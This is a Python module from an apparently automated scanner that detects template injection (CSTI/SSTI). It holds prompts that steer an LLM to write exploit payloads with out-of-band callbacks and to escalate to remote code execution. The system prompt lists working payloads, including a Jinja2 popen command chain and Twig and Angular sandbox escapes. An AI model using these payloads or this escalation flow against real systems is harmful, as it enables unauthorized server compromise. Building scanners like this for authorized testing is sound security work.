"""
CSTI Pipeline

ORCHESTRATION: 6-Level Escalation Pipeline (L0-L6) and main exploit flow.
Contains the escalation logic, smart probes, and validation pipeline.

Most functions here are I/O (they make HTTP requests, call Playwright, etc.)
but they are composed from pure validation/engine functions.
"""

import asyncio
import json
from typing import Dict, List, Optional, Tuple
from pathlib import Path
from urllib.parse import urlparse, parse_qs

from bugtrace.agents.csti.types import CSTIFinding
from bugtrace.agents.csti.engines import (
    fingerprint_engines,
    detect_engine_from_payload,
    classify_engine_type,
    is_client_side_engine,
)
from bugtrace.agents.csti.payloads import (
    PAYLOAD_LIBRARY,
    build_l2_payload_list,
    get_universal_bypass_payloads,
    should_stop_testing,
)
from bugtrace.agents.csti.validation import (
    check_csti_confirmed,
    check_arithmetic_evaluation,
    check_string_multiplication,
    check_config_reflection,
    check_engine_signatures,
    check_error_signatures,
    is_client_side_payload,
)
from bugtrace.agents.csti.exploitation import (
    inject_param,
    create_finding,
    send_csti_payload_raw,
    get_encoded_payloads,
    fetch_page,
    get_baseline_content,
)
from bugtrace.agents.csti.dedup import (
    generate_csti_fingerprint,
    fallback_fingerprint_dedup,
    normalize_csti_finding_params,
)
from bugtrace.core.http_manager import http_manager, ConnectionProfile
from bugtrace.core.ui import dashboard
from bugtrace.core.config import settings
from bugtrace.utils.logger import get_logger
from bugtrace.utils.parsers import XmlParser

logger = get_logger("agents.csti.pipeline")


# =========================================================================
# VALIDATION PIPELINE (4-Level)
# =========================================================================

def build_template_system_prompt() -> str:  # PURE
    """Get system prompt for template analysis."""
    return """You are an elite Template Injection specialist.
CSTI (Client-Side): Angular, Vue - executes in browser
SSTI (Server-Side): Jinja2, Twig, Freemarker - executes on server (more dangerous)

For each engine, you must know:
- Angular 1.x: {{constructor.constructor('code')()}} - sandbox bypass needed
- Vue 2.x: {{_c.constructor('code')()}}
- Jinja2: {{config}}, {{lipsum.__globals__['os'].popen('cmd').read()}}
- Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}

CRITICAL: Generate payloads that:
1. Prove code execution (not just reflection)
2. Include OOB callback for blind detection
3. Escalate to RCE if SSTI (server-side)"""


def build_template_user_prompt(
    url: str, param: str, detected_engines: List[str],
    interactsh_url: str, html: str,
) -> str:  # PURE
    """Build user prompt for LLM template analysis."""
    return f"""Analyze this page for Template Injection:
URL: {url}
Parameter: {param}
Detected Engines: {detected_engines}
OOB Callback: {interactsh_url}

HTML (truncated):
```html
{html[:6000]}
```

Generate 1-3 PRECISE payloads for the detected engine(s).
For each payload, explain:
1. Target engine
2. What it exploits (sandbox bypass, RCE, etc.)
3. Expected output

Response format (XML):
<payloads>
  <payload>
    <engine>angular|vue|jinja2|twig|etc</engine>
    <code>THE_PAYLOAD</code>
    <exploitation>What it does</exploitation>
    <expected_output>What to look for</expected_output>
  </payload>
</payloads>"""


def parse_llm_payloads(content: str, interactsh_url: str) -> List[Dict]:  # PURE
    """
    Parse LLM response into payload dicts.

    Args:
        content: LLM response text
        interactsh_url: Interactsh URL for placeholder replacement

    Returns:
        List of dicts with 'code' and 'engine' keys
    """
    payloads = XmlParser.extract_list(content, "payload")
    parsed_items = []

    for p_str in payloads:
        code = XmlParser.extract_tag(p_str, "code")
        engine = XmlParser.extract_tag(p_str, "engine")

        if code:
            if "{{INTERACTSH}}" in code and interactsh_url:
                code = code.replace("{{INTERACTSH}}", interactsh_url)

            parsed_items.append({
                "code": code,
                "engine": engine or "unknown",
            })

    return parsed_items


async def llm_smart_template_analysis(
    html: str,
    url: str,
    param: str,
    detected_engines: List[str],
    interactsh_url: str,
) -> List[Dict]:  # I/O
    """
    LLM-First Strategy: Analyze HTML and generate targeted CSTI/SSTI payloads.

    Args:
        html: Page HTML content
        url: Target URL
        param: Parameter name
        detected_engines: List of detected engine names
        interactsh_url: Interactsh URL for OOB

    Returns:
        List of payload dicts with 'code' and 'engine' keys
    """
    from bugtrace.core.llm_client import llm_client

    system_prompt = build_template_system_prompt()
    user_prompt = build_template_user_prompt(url, param, detected_engines, interactsh_url, html)

    try:
        response = await llm_client.generate(
            prompt=user_prompt,
            module_name="CSTI_SMART_ANALYSIS",
            system_prompt=system_prompt,
            model_override=settings.MUTATION_MODEL,
            max_tokens=3000,
            temperature=0.3,
        )
        return parse_llm_payloads(response, interactsh_url)
    except Exception as e:
        logger.error(f"LLM Smart Analysis failed: {e}", exc_info=True)
        return []


async def llm_analyze_and_dedup(
    wet_findings: List[Dict],
    context: str,
    tech_stack_context: Dict = None,
    csti_prime_directive: str = "",
    csti_dedup_context_fn=None,
    detect_engines_fn=None,
) -> List[Dict]:  # I/O
    """
    Use LLM to intelligently deduplicate CSTI findings (v3.2: Context-Aware).
    Falls back to fingerprint-based dedup if LLM fails.

    Args:
        wet_findings: List of WET finding dicts
        context: Scan context string
        tech_stack_context: Optional tech stack context
        csti_prime_directive: Optional CSTI prime directive prompt
        csti_dedup_context_fn: Optional callable(tech_stack) -> str
        detect_engines_fn: Optional callable(frameworks, tech_tags, lang) -> List[str]

    Returns:
        Deduplicated list of findings
    """
    from bugtrace.core.llm_client import llm_client

    tech_stack = tech_stack_context or {}
    lang = tech_stack.get("lang", "generic")
    frameworks = tech_stack.get("frameworks", [])
    waf = tech_stack.get("waf")

    csti_dedup_context = csti_dedup_context_fn(tech_stack) if csti_dedup_context_fn and tech_stack else ""

    raw_profile = tech_stack.get("raw_profile", {})
    tech_tags = [t.lower() for t in raw_profile.get("tech_tags", [])]
    detected_engines = detect_engines_fn(frameworks, tech_tags, lang) if detect_engines_fn else []

    system_prompt = f"""You are an expert CSTI/SSTI deduplication analyst with deep knowledge of template engines.

{csti_prime_directive}

{csti_dedup_context}

## TARGET CONTEXT
- Backend Language: {lang}
- Detected Engines: {', '.join(detected_engines) if detected_engines else 'Unknown'}
- WAF: {waf or 'None detected'}
- Frameworks: {', '.join(frameworks[:3]) if frameworks else 'Unknown'}

Your job is to identify and remove duplicate template injection findings while preserving unique vulnerabilities.
Different template engines represent different attack surfaces - NEVER merge findings with different engines."""

    prompt = f"""Analyze {len(wet_findings)} potential CSTI/SSTI findings.

## WET FINDINGS (may contain duplicates):
{json.dumps(wet_findings, indent=2)}

## TASK
1. Apply engine-based deduplication rules
2. Distinguish CSTI (client-side: Angular, Vue) from SSTI (server-side: Jinja2, Twig)
3. Prioritize findings for detected engines: {detected_engines or ['generic']}
4. Remove true duplicates (same URL + param + engine)
5. IMPORTANT: For client-side engines (Angular, Vue), multiple params on the SAME PAGE share the same scope. Merge them into ONE finding per page per engine (keep the first param as representative)

## OUTPUT FORMAT (JSON only, no markdown):
{{
  "findings": [
    {{
      "url": "...",
      "parameter": "...",
      "template_engine": "jinja2|twig|angular|vue|freemarker|erb|unknown",
      "injection_type": "SSTI|CSTI",
      "rationale": "why unique",
      "attack_priority": 1-5,
      "recommended_payload": "specific payload for this engine"
    }}
  ],
  "duplicates_removed": <count>,
  "reasoning": "Brief deduplication strategy"
}}"""

    try:
        response = await llm_client.generate(
            prompt=prompt,
            system_prompt=system_prompt,
            module_name="CSTI_DEDUP",
            temperature=0.2,
        )

        result = json.loads(response)
        dry_list = result.get("findings", [])

        if dry_list:
            logger.info(f"[CSTI] LLM deduplication: {result.get('reasoning', 'No reasoning')}")
            logger.info(f"[CSTI] LLM deduplication successful: {len(wet_findings)} -> {len(dry_list)}")
            return dry_list
        else:
            logger.warning("[CSTI] LLM returned empty list, using fallback")
            return fallback_fingerprint_dedup(wet_findings)

    except Exception as e:
        logger.warning(f"[CSTI] LLM deduplication failed: {e}, using fallback")
        return fallback_fingerprint_dedup(wet_findings)
